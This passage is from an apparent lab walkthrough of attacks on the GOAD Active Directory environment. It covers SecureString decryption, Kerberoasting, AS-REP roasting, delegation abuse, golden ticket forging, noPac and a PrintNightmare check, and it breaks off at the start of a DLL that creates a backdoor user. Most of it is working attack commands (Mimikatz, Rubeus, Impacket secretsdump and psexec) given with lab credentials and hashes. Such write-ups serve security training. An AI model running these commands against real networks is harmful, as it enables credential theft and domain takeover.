<span class="c"># T.L.</span>
</code></pre></div>
<p>According to the <a href="https://learn.microsoft.com/it-it/powershell/module/microsoft.powershell.security/convertfrom-securestring?view=powershell-7.4">ConvertFrom-SecureString</a> documentation, when providing a key, the <strong>secure string</strong> gets encrypted with AES.</p>
<p>Having the key, it's possible to recover the original secure string as follows:</p>
<div class="highlight"><pre><span></span><code><span class="nv">$keyData</span> <span class="p">=</span> <span class="n">177</span><span class="p">,</span> <span class="n">252</span><span class="p">,</span> <span class="n">228</span><span class="p">,</span> <span class="n">64</span><span class="p">,</span> <span class="n">28</span><span class="p">,</span> <span class="n">91</span><span class="p">,</span> <span class="n">12</span><span class="p">,</span> <span class="n">201</span><span class="p">,</span> <span class="n">20</span><span class="p">,</span> <span class="n">91</span><span class="p">,</span> <span class="n">21</span><span class="p">,</span> <span class="n">139</span><span class="p">,</span> <span class="n">255</span><span class="p">,</span> <span class="n">65</span><span class="p">,</span> <span class="n">9</span><span class="p">,</span> <span class="n">247</span><span class="p">,</span> <span class="n">41</span><span class="p">,</span> <span class="n">55</span><span class="p">,</span> <span class="n">164</span><span class="p">,</span> <span class="n">28</span><span class="p">,</span> <span class="n">75</span><span class="p">,</span> <span class="n">132</span><span class="p">,</span> <span class="n">143</span><span class="p">,</span> <span class="n">71</span><span class="p">,</span> <span class="n">62</span><span class="p">,</span> <span class="n">191</span><span class="p">,</span> <span class="n">211</span><span class="p">,</span> <span class="n">61</span><span class="p">,</span> <span class="n">154</span><span class="p">,</span> <span class="n">61</span><span class="p">,</span> <span class="n">216</span><span class="p">,</span> <span class="n">91</span>
<span class="nv">$secret</span><span class="p">=</span><span class="s2">"76492d1116743f0423413b16050a5345MgB8AGkAcwBDACsAUwArADIAcABRAEcARABnAGYAMwA3AEEAcgBFAEIAYQB2AEEAPQA9AHwAZQAwADgANAA2ADQAMABiADYANAAwADYANgA1ADcANgAxAGIAMQBhAGQANQBlAGYAYQBiADQAYQA2ADkAZgBlAGQAMQAzADAAN  </span>
<span class="s2">QAyADUAMgAyADYANAA3ADAAZABiAGEAOAA0AGUAOQBkAGMAZABmAGEANAAyADkAZgAyADIAMwA="</span>

<span class="nv">$secureString</span><span class="p">=</span><span class="nb">ConvertTo-SecureString</span> <span class="n">-Key</span> <span class="nv">$keyData</span> <span class="n">-String</span> <span class="nv">$secret</span>
</code></pre></div>
<p>and then recover the plaintext value from the secure string as follows:</p>
<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="nb">New-Object</span> <span class="n">PSCredential</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$secureString</span><span class="p">).</span><span class="n">GetNetworkCredential</span><span class="p">().</span><span class="n">Password</span>
</code></pre></div>
<p>The result is:</p>
<div class="highlight"><pre><span></span><code>powerkingftw135
</code></pre></div>
<h2 id="roasting">Roasting</h2>
<h3 id="kerberoasting">Kerberoasting</h3>
<p>Enumerating SPNs:</p>
<div class="highlight"><pre><span></span><code>setspn<span class="w"> </span>-T<span class="w"> </span>NORTH<span class="w"> </span>-Q<span class="w"> </span>*/*
</code></pre></div>
<p><img alt="north-spns.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-spns.png"/></p>
<p>Following steps have been conducted from a RDP session since a Kerberos error was being returned using Evil-WinRM:</p>
<p><img alt="north-kerberos-error.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-kerberos-error.png"/></p>
<p>Requesting TGS for the three SPNs accounts</p>
<div class="highlight"><pre><span></span><code><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>

<span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">"HTTP/eyrie.north.sevenkingdoms.local"</span>
<span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">"CIFS/thewall.north.sevenkingdoms.local"</span>
<span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">"MSSQLSvc/castelblack.north.sevenkingdoms.local"</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code>klist
</code></pre></div>
<p><img alt="north-kerberoasting-tickets.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-kerberoasting-tickets.png"/></p>
<p>Dump tickets using <code>Invoke-Mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"kerberos::list /export"'</span>
</code></pre></div>
<p>Convert kirbi tickets to john/hashcat format:</p>
<div class="highlight"><pre><span></span><code>/usr/share/kerberoast/kirbi2john.py<span class="w"> </span>&lt;kirbi<span class="w"> </span>ticket<span class="w"> </span>path&gt;<span class="w"> </span>&gt;<span class="w"> </span>&lt;outputpath&gt;
</code></pre></div>
<p>And crack each ticket with hashcat:</p>
<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>&lt;ticket<span class="w"> </span>path&gt;<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</code></pre></div>
<p>The TGS for <code>CIFS/thewall.north.sevenkingdoms.local</code> gets successfully decrypted using rockyou:</p>
<p><img alt="north-kerbearoasting-cracking.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-kerbearoasting-cracking.png"/></p>
<p>User <code>NORTH\jon.snow</code>'s password is <code>iknownothing</code>.</p>
<h3 id="as-rep-roasting">AS-REP Roasting</h3>
<h4 id="northsevenkingdomslocal">NORTH.SEVENKINGDOMS.LOCAL</h4>
<p>Find AS-REP-roastable users:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">DoesNotRequirePreAuth</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">DoesNotRequirePreAuth</span>
</code></pre></div>
<p><img alt="north-asreproasting-users.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-asreproasting-users.png"/></p>
<p>Request TGS for <code>brandon.stark</code> using <code>Invoke-Rubeus</code>:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Invoke-Rubeus</span> <span class="n">-Command</span> <span class="s2">"asreproast /user:brandon.stark /nowrap"</span>
</code></pre></div>
<p><img alt="north-asproasting-request-tgs.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-asproasting-request-tgs.png"/></p>
<p>Crack TGS with hashcat:</p>
<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>&lt;ticket&gt;<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</code></pre></div>
<p><img alt="north-asproasting-cracking.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-asproasting-cracking.png"/></p>
<p>User <code>NORTH\brandon.stark</code>'s password is <code>iseedeadpeople</code>.</p>
<h4 id="essoslocal">ESSOS.local</h4>
<p>Find AS-REP-roastable users on <code>essos.local</code> abusing trust with <code>sevenkingdoms</code>:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>essos.local<span class="w"> </span>-d<span class="w"> </span>SEVENKINGDOMS.local<span class="w"> </span>-u<span class="w"> </span>cersei.lannister<span class="w"> </span>-p<span class="w"> </span>il0vejaime<span class="w"> </span>--query<span class="w"> </span><span class="s2">"(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"</span><span class="w"> </span><span class="s2">"samaccountname"</span>
</code></pre></div>
<p><img alt="essos-asreproast-enum.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-asreproast-enum.png"/></p>
<p>Request TGS for <code>missandei</code> using Impacket's <code>GetNPUsers</code> anonymously:</p>
<div class="highlight"><pre><span></span><code>impacket-GetNPUsers<span class="w"> </span>-no-pass<span class="w"> </span>essos.local/missandei
</code></pre></div>
<p><img alt="essos-asreproast.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-asreproast.png"/></p>
<p>Crack the TGS with <code>hashcat</code>:</p>
<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>missandei.asreproast<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</code></pre></div>
<p><img alt="essos-asreproast-crack.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-asreproast-crack.png"/></p>
<p>Password for <code>missandei</code> account is <code>fr3edom</code>.</p>
<h2 id="delegation-attacks_2">Delegation Attacks</h2>
<h3 id="unconstrained-delegation">Unconstrained Delegation</h3>
<p>Enumerate vulnerable computers:</p>
<div class="highlight"><pre><span></span><code>Get-ADComputer<span class="w"> </span>-Filter<span class="w"> </span><span class="o">{</span>TrustedForDelegation<span class="w"> </span>-eq<span class="w"> </span><span class="nv">$True</span><span class="o">}</span>
</code></pre></div>
<p><img alt="north-unconstrained-delegation-enum.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-unconstrained-delegation-enum.png"/></p>
<p>Since winterfell is vulnerable and the attacker has control on this server, it's possible to complete the attack; the next step is to force another computer (the parent domain controller - kingslanding) to authenticate against the vulnerable host.</p>
<p>Check if kingslanding can be forced to connect to winterfell:</p>
<div class="highlight"><pre><span></span><code>coercer<span class="w"> </span>scan<span class="w"> </span>-u<span class="w"> </span>robb.stark<span class="w"> </span>-p<span class="w"> </span>sexywolfy<span class="w"> </span>--target-ip<span class="w"> </span><span class="m">10</span>.1.0.10
</code></pre></div>
<p><img alt="north-unconstrained-delegation-scan.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-unconstrained-delegation-scan.png"/></p>
<p>On winterfell, llisten for new tickets in memory with <code>Rubeus</code>:</p>
<div class="highlight"><pre><span></span><code>Rubeus.exe monitor /interval:5 /nowrap
</code></pre></div>
<p><img alt="north-unconstrained-delegation-tgt-dump.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-unconstrained-delegation-tgt-dump.png"/></p>
<p>Force kingslanding to connect to winterfell:</p>
<div class="highlight"><pre><span></span><code>coercer<span class="w"> </span>coerce<span class="w"> </span>-u<span class="w"> </span>robb.stark<span class="w"> </span>-p<span class="w"> </span>sexywolfy<span class="w"> </span>--target-ip<span class="w"> </span><span class="m">10</span>.1.0.10<span class="w"> </span>--listener-ip<span class="w"> </span><span class="m">10</span>.1.0.11
</code></pre></div>
<p><img alt="north-unconstrained-delegation-force-auth.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-unconstrained-delegation-force-auth.png"/></p>
<p>Convert Base64 ticket to kirbi format to ccache format with Impacket's <code>ticketConverter</code></p>
<div class="highlight"><pre><span></span><code>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span>-d<span class="w"> </span>kingslanding.b64<span class="w"> </span>&gt;<span class="w"> </span>kingslanding.kirbi
impacket-ticketConverter<span class="w"> </span>kingslanding.kirbi<span class="w"> </span>kingslanding.ccache
</code></pre></div>
<p>Perform a pass-the-ticket attack with Impacket's <code>secretdump</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>SEVENKINGDOMS.LOCAL/<span class="s1">'KINGSLANDING$'</span>@KINGSLANDING
</code></pre></div>
<p><img alt="north-unconstrained-delegation-pass-the-ticket.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-unconstrained-delegation-pass-the-ticket.png"/></p>
<h3 id="constrained-delegation">Constrained Delegation</h3>
<h4 id="alternative-1">Alternative 1</h4>
<p>Enumerate users with constrained delegation enabled:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-ADObject</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span> <span class="o">-ne</span> <span class="s2">"$null"</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">msDS-AllowedToDelegateTo</span> <span class="p">|</span> <span class="nb">select </span><span class="n">DistinguishedName</span><span class="p">,</span> <span class="n">msDS-AllowedToDelegateTo</span>
</code></pre></div>
<p><img alt="north-constrained-delegation-enum-alt1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-enum-alt1.png"/></p>
<p>Having <code>jon.snow</code> credentials/hash it's possible to abuse constrained delegation to impersonate any user (Administrator) for the SPN <code>CIFS/winterfell.north.sevenkingdoms.local</code></p>
<p>Request TGT for <code>jon.snow</code>:</p>
<div class="highlight"><pre><span></span><code>.<span class="se">\R</span>ubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:jon.snow<span class="w"> </span>/password:iknownothing<span class="w"> </span>/domain:north.sevenkingdoms.local<span class="w"> </span>/outfile:jon.snow.tgt.kirbi
</code></pre></div>
<p><img alt="north-constrained-delegation-tgt-alt1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-tgt-alt1.png"/></p>
<p>Execute S4U2Self followed by a S4U2Proxy to impersonate <code>Administrator</code>:</p>
<div class="highlight"><pre><span></span><code>.<span class="se">\R</span>ubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/ticket:jon.snow.tgt.kirbi<span class="w"> </span>/impersonateuser:administrator<span class="w"> </span>/domain:north.sevenkingdoms.local<span class="w"> </span>/msdsspn:CIFS/winterfell.north.sevenkingdoms.local<span class="w"> </span>/dc:north.sevenkingdoms.local<span class="w"> </span>/ptt
</code></pre></div>
<p><img alt="north-constrained-delegation-s4u-alt1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-s4u-alt1.png"/></p>
<p>On the attacker machine, convert Base64 ticket to kirbi format to ccache format with Impacket's <code>ticketConverter</code></p>
<div class="highlight"><pre><span></span><code>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span>-d<span class="w"> </span>jon.snow.s4u.administrator.b64<span class="w"> </span>&gt;<span class="w"> </span>jon.snow.s4u.administrator.kirbi
impacket-ticketConverter<span class="w"> </span>jon.snow.s4u.administrator.kirbi<span class="w"> </span>jon.snow.s4u.administrator.ccache
</code></pre></div>
<p>Run psexec with resulting ticket:</p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>jon.snow.s4uproxy.administrator.ccache
impacket-psexec<span class="w"> </span>-no-pass<span class="w"> </span>-k<span class="w"> </span>winterfell.north.sevenkingdoms.local
</code></pre></div>
<p><img alt="north-constrained-delegation-ptt-alt1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-ptt-alt1.png"/></p>
<h4 id="alternative-2">Alternative 2</h4>
<p>Enumerate users with constrained delegation enabled:</p>
<div class="highlight"><pre><span></span><code>impacket-findDelegation<span class="w"> </span>north.sevenkingdoms.local/robb.stark:sexywolfy<span class="w"> </span>-target-domain<span class="w"> </span>north.s
</code></pre></div>
<p><img alt="north-constrained-delegation-enum-alt2.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-enum-alt2.png"/></p>
<p>Having <code>jon.snow</code> credentials/hash it's possible to abuse constrained delegation to impersonate any user (Administrator) for the SPN <code>CIFS/winterfell.north.sevenkingdoms.local</code></p>
<p>Request TGT for <code>jon.snow</code> and execute S4U2Self followed by a S4U2Proxy to impersonate <code>Administrator</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-getST<span class="w"> </span>-spn<span class="w"> </span>CIFS/winterfell.north.sevenkingdoms.local<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>north.sevenkingdoms.local/jon.snow:iknownothing
</code></pre></div>
<p><img alt="north-constrained-delegation-tgt+s4u-alt2.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-tgt+s4u-alt2.png"/></p>
<p>Run psexec with resulting ticket:</p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
impacket-psexec<span class="w"> </span>-no-pass<span class="w"> </span>-k<span class="w"> </span>winterfell.north.sevenkingdoms.local
</code></pre></div>
<p><img alt="north-constrained-delegation-ptt-alt1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-ptt-alt1.png"/></p>
<h3 id="resource-based-constrained-delegation_1">Resource-based constrained delegation</h3>
<p>Enumerate machine quota on KINGSLANDING.SEVENKINGDOMS.local:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>kingslanding.sevenkingdoms.local<span class="w"> </span>-d<span class="w"> </span>SEVENKINGDOMS.local<span class="w"> </span>-u<span class="w"> </span>cersei.lannister<span class="w"> </span>-p<span class="w"> </span>il0vejaime<span class="w"> </span>-M<span class="w"> </span>maq
</code></pre></div>
<p><img alt="sevenkingdoms-rbcd-quota-enum.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-rbcd-quota-enum.png"/></p>
<p>Create new computer object and it to the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> of <code>KINGSLANDING$</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-rbcd<span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">'KINGSLANDING$'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.10<span class="w"> </span>-action<span class="w"> </span><span class="s1">'read'</span><span class="w"> </span>SEVENKINGDOMS/cersei.lannister:il0vejaime@kingslanding.sevenkingdoms.local

impacket-addcomputer<span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">'rbcdcomputer$'</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">'password'</span><span class="w"> </span>-dc-host<span class="w"> </span><span class="m">10</span>.1.0.10<span class="w"> </span>SEVENKINGDOMS/cersei.lannister:il0vejaime

impacket-rbcd<span class="w"> </span>-delegate-from<span class="w"> </span><span class="s1">'rbcdcomputer$'</span><span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">'KINGSLANDING$'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.10<span class="w"> </span>-action<span class="w"> </span><span class="s1">'write'</span><span class="w"> &nbsp;</span>SEVENKINGDOMS/cersei.lannister:il0vejaime

impacket-rbcd<span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">'KINGSLANDING$'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.10<span class="w"> </span>-action<span class="w"> </span><span class="s1">'read'</span><span class="w"> </span>SEVENKINGDOMS/cersei.lannister:il0vejaime
</code></pre></div>
<p><img alt="sevenkingdoms-rbcd-add-computer.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-rbcd-add-computer.png"/></p>
<p>Request a  <code>cifs/kingslanding.sevenkingdoms.local</code> TGS on behalf of Administrator to <code>rbcdcomputer$</code> that will perform <code>S4U</code>:</p>
<p><img alt="sevenkingdoms-rbcd-request-tgs.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-rbcd-request-tgs.png"/></p>
<p>Use the TGS to authenticate as Administrator on <code>KINGSLANDING</code>:</p>
<p><img alt="sevenkingdoms-rbcd-ptt.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/sevenkingdoms-rbcd-ptt.png"/></p>
<h2 id="lateral-movement_1">Lateral Movement</h2>
<h3 id="golden-ticket">Golden Ticket</h3>
<h4 id="child-domain-to-parent">Child domain to parent</h4>
<p>Dump NTLM hashes and Kerberos keys:</p>
<div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>robb.stark:sexywolfy@winterfell.north.sevenkingdoms.local
</code></pre></div>
<p><img alt="north-golden-ticket-krbtgt.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-golden-ticket-krbtgt.png"/></p>
<p>Get child domain SID:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>winterfell.north.sevenkingdoms.local<span class="w"> </span>-u<span class="w"> </span>NORTH<span class="se">\\</span>robb.stark<span class="w"> </span>-p<span class="w"> </span>sexywolfy<span class="w"> </span>--get-sid
</code></pre></div>
<p><img alt="north-golden-ticket-child-domain-sid.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-golden-ticket-child-domain-sid.png"/></p>
<p>Get parent domain SID:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>kingslanding.sevenkingdoms.local<span class="w"> </span>-u<span class="w"> </span>NORTH<span class="se">\\</span>robb.stark<span class="w"> </span>-p<span class="w"> </span>sexywolfy<span class="w"> </span>--get-sid
</code></pre></div>
<p><img alt="north-golden-ticket-parent-domain-sid.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-golden-ticket-parent-domain-sid.png"/></p>
<p>Forge a Golden Ticket:</p>
<div class="highlight"><pre><span></span><code>impacket-ticketer<span class="w"> </span>-domain<span class="w"> </span><span class="s1">'north.sevenkingdoms.local'</span><span class="w"> </span>-domain-sid<span class="w"> </span><span class="s1">'S-1-5-21-3880070986-3446816858-598620870'</span><span class="w"> </span>-extra-sid<span class="w"> </span><span class="s1">'S-1-5-21-1562319857-885082017-3582239089-519'</span><span class="w"> </span>-nthash<span class="w"> </span><span class="s1">'74997deb76cf0e9e1ea194f2092127e6'</span><span class="w"> </span><span class="s1">'Administrator'</span>
</code></pre></div>
<p><img alt="north-golden-ticket-forging.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-golden-ticket-forging.png"/></p>
<p><strong>Note</strong>: in SID History (<code>-extra-sid</code>) has been set the parent domain (<code>sevenkingdoms.local</code>) Enterprise Administrators group's SID (<code>&lt;domain SID&gt;-519</code>).</p>
<p>Use the forged Golden Ticket to pwn the parent domain abusing implicit trust:</p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
impacket-psexec<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local
</code></pre></div>
<p><img alt="north-golden-ticket-pass-the-ticket.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-golden-ticket-pass-the-ticket.png"/></p>
<h3 id="samaccountname-nopac_1">sAMAccountName (nopac)</h3>
<h4 id="manually">Manually</h4>
<p>Enumerate DC for nopac:</p>
<div class="highlight"><pre><span></span><code>nxc smb essos.local -u 'khal.drogo' -p 'horse' -M nopac
</code></pre></div>
<p><img alt="essos-nopac-enumerate.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-nopac-enumerate.png"/></p>
<p>Add a new machine account:</p>
<div class="highlight"><pre><span></span><code>impacket-addcomputer -computer-name 'horse$' -computer-pass 'password' -dc-host essos.local -domain-netbios essos.local 'essos.local/khal.drogo:horse'
</code></pre></div>
<p><img alt="essos-nopac-addcomputer.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-nopac-addcomputer.png"/></p>
<p>Cleanup newly created machine account's SPNs:</p>
<div class="highlight"><pre><span></span><code>python3 addspn.py --clear -t 'horse$' -u 'essos.local\khal.drogo' -p 'horse' 'meereen.essos.local'
</code></pre></div>
<p><img alt="essos-nopac-clean-spns.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-nopac-clean-spns.png"/></p>
<p>Use <code>renameMachine.py</code> to rename the newly created machine account to the target domain controller name (without $):</p>
<div class="highlight"><pre><span></span><code>python3 renameMachine.py -current-name 'horse$' -new-name 'meereen' -dc-ip 'essos.local' 'essos.local'/'khal.drogo':'horse' 
</code></pre></div>
<p><img alt="essos-nopac-rename-computer.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-nopac-rename-computer.png"/></p>
<p>Request a TGT with the newly created machine account: </p>
<div class="highlight"><pre><span></span><code>impacket-getTGT -dc-ip 'essos.local' 'essos.local'/'meereen':'password'
</code></pre></div>
<p><img alt="essos-nopac-req-tgt.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-nopac-req-tgt.png"/></p>
<p>Rename  back to its original name the machine account: </p>
<div class="highlight"><pre><span></span><code>python3 renameMachine.py -current-name 'meereen' -new-name 'horse$' -dc-ip 'essos.local' 'essos.local'/'khal.drogo':'horse'
</code></pre></div>
<p><img alt="essos-nopac-rename-computer-back.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-nopac-rename-computer-back.png"/></p>
<p>Use the TGT to request a TGS with <strong>S4U2Self</strong>, abusing CVE-2021-42287; TGS will be wrongly be provided as if the TGT belong to the DC:</p>
<div class="highlight"><pre><span></span><code><span class="k">export</span><span class="w"> </span><span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">meereen</span><span class="o">.</span><span class="n">ccache</span>
<span class="n">impacket</span><span class="o">-</span><span class="n">getST</span><span class="w"> </span><span class="o">-</span><span class="bp">self</span><span class="w"> </span><span class="o">-</span><span class="n">impersonate</span><span class="w"> </span><span class="s1">'Administrator'</span><span class="w"> </span><span class="o">-</span><span class="n">altservice</span><span class="w"> </span><span class="s1">'cifs/meereen.essos.local'</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="s1">'essos.local'</span><span class="w"> </span><span class="s1">'essos.local'</span><span class="o">/</span><span class="s1">'meereen'</span>
</code></pre></div>
<p><img alt="essos-nopac-s4u2self.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-nopac-s4u2self.png"/></p>
<p>Use TGS to dump secrets from the DC:</p>
<div class="highlight"><pre><span></span><code><span class="k">export</span><span class="w"> </span><span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">Administrator</span><span class="err">@</span><span class="n">cifs_meereen</span><span class="o">.</span><span class="n">essos</span><span class="o">.</span><span class="n">local</span><span class="err">@</span><span class="n">ESSOS</span><span class="o">.</span><span class="n">LOCAL</span><span class="o">.</span><span class="n">ccache</span>
<span class="n">impacket</span><span class="o">-</span><span class="n">secretsdump</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="s1">'essos.local'</span><span class="w"> </span><span class="err">@</span><span class="s1">'meereen.essos.local'</span>
</code></pre></div>
<p><img alt="essos-nopac-secretdumps.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-nopac-secretdumps.png"/></p>
<p>Remove the machine account using Administrator hashes (<code>khal.drogo</code> has not enough privileges):</p>
<div class="highlight"><pre><span></span><code>impacket-addcomputer -computer-name 'horse$' -computer-pass 'password' -dc-host essos.local -domain-netbios essos.local 'essos.local/Administrator' -hashes aad3b435b51404eeaad3b435b51404ee:b1794c0bfede743de3a1c22425c2c5e1 -delete 
</code></pre></div>
<p><img alt="essos-nopac-remove-computer.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-nopac-remove-computer.png"/></p>
<h4 id="automatically">Automatically</h4>
<p>Use <code>noPac.py</code> to automatically abuse nopac:</p>
<div class="highlight"><pre><span></span><code>python3 noPac.py essos.local/khal.drogo:horse -dc-ip 10.1.0.12 --impersonate Administrator -dump
</code></pre></div>
<p><img alt="essos-nopac-noPac.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-nopac-noPac.png"/></p>
<p>Manually remove the computer account using Administrator hashes since <code>khal.drogo</code> has not enough privileges to do it with <code>noPac.py</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-addcomputer -computer-name 'WIN-MKGPXET24EF$' -dc-host essos.local  'essos.local/Administrator' -hashes aad3b435b51404eeaad3b435b51404ee:b1794c0bfede743de3a1c22425c2c5e1 -delete
</code></pre></div>
<p><img alt="essos-nopac-noPac-cleanup.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-nopac-noPac-cleanup.png"/></p>
<h3 id="printnightmare_1">PrintNightmare</h3>
<p>Check if <code>essos.local</code> is vulnerable:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>meereen.essos.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">'khal.drogo'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'horse'</span><span class="w"> </span>-M<span class="w"> </span>printnightmare
</code></pre></div>
<p><img alt="essos-printnightmare-check.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-check.png"/></p>
<p>Create a DLL that will create a backdoor user:</p>
<div class="highlight"><pre><span></span><code><span class="cp">#pragma comment(lib, "Netapi32.lib")</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span><span class="c1"> </span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;lm.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>

